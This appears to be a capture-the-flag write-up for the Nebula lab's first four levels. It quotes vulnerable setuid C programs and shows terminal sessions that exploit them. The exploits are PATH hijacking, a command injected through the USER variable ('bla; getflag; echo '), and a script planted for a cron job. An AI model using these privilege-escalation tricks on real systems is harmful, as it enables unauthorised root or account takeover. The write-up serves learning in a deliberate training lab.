# nebula-exploits
Digging through https://exploit-exercises.com/nebula/

# Level00

## Goal

The goal is to find a setuid program that runs as user level00.

## Walkthrough

* check current user `id`. turns out we are level00:level00
* check `man find`
    * figure out how to search for files with certain permissions. turns out there is a `-perm` flag
    * google for bitmask of setuid bit => 4000
* `find / -perm -4000 | more`
* note the file `/rofs/bin/.../flag00`. examine it with `ls -al /rofs/bin/.../flag00` => got it.
* run `/rofs/bin/.../flag00`
* run `getflag`
* done.

# Level01

## Goal

We need to exploit a vulnerability in a C program. The code is  given and goes as follows:

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

## Walkthrough

The vulnerability is that the program calls `echo` without an absolute path. So as a user, you can manipulate the `PATH` environment variable and put your own `echo` program in the new path.

A symbolic link to the `getflag` program will do the trick. Since the program `leve01` has an S-bit set for the user, and is owned by `flag01`, we can actually get the flag.

```
level01@nebula:~$ ls /home/flag01/
flag01
level01@nebula:~$ ls -al /home/flag01/
total 13
drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile
level01@nebula:~$ /home/flag01/flag01
and now what?
level01@nebula:~$ ln -s /bin/getflag echo
level01@nebula:~$ export PATH=.:$PATH
level01@nebula:~$ /home/flag01/flag01
You have successfully executed getflag on a target account
level01@nebula:~$
```

# Level02

The program uses untrusted user input for the `system` call.

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);

  system(buffer);
}
```

Can be exploited by setting the `USER` env variable.

```
level02@nebula:/home/flag02$ USER="bla; getflag; echo "
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo bla; getflag; echo  is cool")
bla
You have successfully executed getflag on a target account
is cool
level02@nebula:/home/flag02$
```

# Level03

Put a SHELL script inside the writable directory. Wait until the cronjob kicks in. It will be executed by the user `flag03`.

```
level03@nebula:/home/flag03$ cat writable.d/getflag
#!/bin/bash

getflag > /home/flag03/output
level03@nebula:/home/flag03$ ls
output  writable.d  writable.sh
level03@nebula:/home/flag03$ cat output
You have successfully executed getflag on a target account
level03@nebula:/home/flag03$
```
